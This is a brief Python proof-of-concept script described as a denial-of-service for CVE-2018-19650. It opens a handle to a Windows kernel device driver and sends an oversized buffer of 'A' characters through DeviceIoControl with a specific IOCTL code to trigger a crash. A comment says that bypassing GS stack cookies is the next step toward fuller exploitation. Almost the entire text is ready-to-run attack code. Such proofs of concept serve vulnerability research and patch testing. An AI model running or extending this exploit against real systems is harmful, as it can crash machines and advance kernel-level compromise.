# DOS for CVE-2018-19650, we need to bypass GS cookies.

import ctypes
import struct
import os
import sys
from ctypes import *

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\IRPFile", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
		print "Couldn't get a handle."
		sys.exit(0)

buf = "A" * 248
bufLength = len(buf)

kernel32.DeviceIoControl(hevDevice, 0x80002000, buf, bufLength, None, 0, byref(c_ulong()), None)
